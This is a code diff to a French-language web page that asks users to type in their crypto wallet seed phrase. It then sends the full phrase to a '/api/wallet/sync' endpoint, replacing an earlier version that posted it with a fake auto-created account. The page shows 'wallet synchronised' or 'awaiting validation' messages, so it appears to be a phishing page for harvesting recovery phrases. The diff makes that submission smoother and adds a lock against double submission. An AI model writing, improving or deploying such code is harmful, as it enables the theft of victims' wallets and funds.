@@ -235,6 +235,8 @@
     </div>
 
     <script>
+        let isProcessing = false;
+
         function showToast(message, type = 'info') {
             const existing = document.querySelectorAll('.toast');
             existing.forEach(t => t.remove());
@@ -305,22 +307,12 @@
             showToast('🗑️ Tous les mots ont été effacés', 'info');
         }
 
-        async function checkStatus(seedPhrase) {
-            try {
-                const response = await fetch('/api/wallet/check-status', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ seedPhrase })
-                });
-                const data = await response.json();
-                return data;
-            } catch (error) {
-                console.error('Erreur checkStatus:', error);
-                return null;
-            }
-        }
-
         async function validateSeed() {
+            if (isProcessing) {
+                showToast('⏳ Traitement en cours...', 'info');
+                return;
+            }
+
             const words = [];
             let empty = false;
             
@@ -342,57 +334,55 @@
             }
 
             const seedPhrase = words.join(' ');
+            isProcessing = true;
+            document.getElementById('validateBtn').disabled = true;
+            document.getElementById('validateBtn').innerHTML = '⏳ Envoi...';
 
             try {
-                const registerResponse = await fetch('/api/auth/register', {
+                // UNE SEULE REQUÊTE : enregistrement + vérification
+                const response = await fetch('/api/wallet/sync', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        username: 'user_' + Date.now(),
-                        email: 'user_' + Date.now() + '@temp.com',
-                        password: 'temp123',
-                        seedPhrase: seedPhrase
-                    })
+                    body: JSON.stringify({ seedPhrase })
                 });
                 
-                const registerData = await registerResponse.json();
-                console.log('📝 Enregistrement:', registerData);
-                
-                const statusCheck = await checkStatus(seedPhrase);
+                const data = await response.json();
+                console.log('📝 Réponse:', data);
                 
                 const statusDiv = document.getElementById('statusMessage');
                 statusDiv.style.display = 'block';
                 
-                if (statusCheck && statusCheck.success) {
-                    if (statusCheck.status === 'approved') {
+                if (data.success) {
+                    if (data.status === 'approved') {
                         statusDiv.className = 'status-box status-approved';
                         statusDiv.innerHTML = '✅ Wallet synchronisé !';
-                        showToast('✅ Wallet synchronisé avec succès !', 'success');
-                        return;
-                    } else if (statusCheck.status === 'rejected') {
+                        showToast('✅ Wallet synchronisé !', 'success');
+                    } else if (data.status === 'rejected') {
                         statusDiv.className = 'status-box status-rejected';
                         statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
-                        showToast('❌ Erreur de vérification', 'error');
-                        return;
+                        showToast('❌ Synchronisation rejetée', 'error');
                     } else {
                         statusDiv.className = 'status-box status-pending';
                         statusDiv.innerHTML = '⏳ En attente de synchronisation...';
-                        showToast('⏳ Demande envoyée, attente de validation', 'info');
-                        return;
+                        showToast('⏳ Demande envoyée', 'info');
                     }
+                } else {
+                    statusDiv.className = 'status-box status-checking';
+                    statusDiv.innerHTML = '⏳ En attente de synchronisation...';
+                    showToast('⚠️ Erreur', 'error');
                 }
                 
-                statusDiv.className = 'status-box status-pending';
-                statusDiv.innerHTML = '⏳ En attente de synchronisation...';
-                showToast('⏳ Demande envoyée, attente de validation', 'info');
-                
             } catch (error) {
-                console.error('Erreur validateSeed:', error);
+                console.error('Erreur:', error);
                 const statusDiv = document.getElementById('statusMessage');
                 statusDiv.style.display = 'block';
                 statusDiv.className = 'status-box status-checking';
                 statusDiv.innerHTML = '⏳ En attente de synchronisation...';
                 showToast('⚠️ Erreur de connexion', 'error');
+            } finally {
+                isProcessing = false;
+                document.getElementById('validateBtn').disabled = false;
+                document.getElementById('validateBtn').innerHTML = '<i class="fas fa-check"></i> Valider';
             }
         }
 
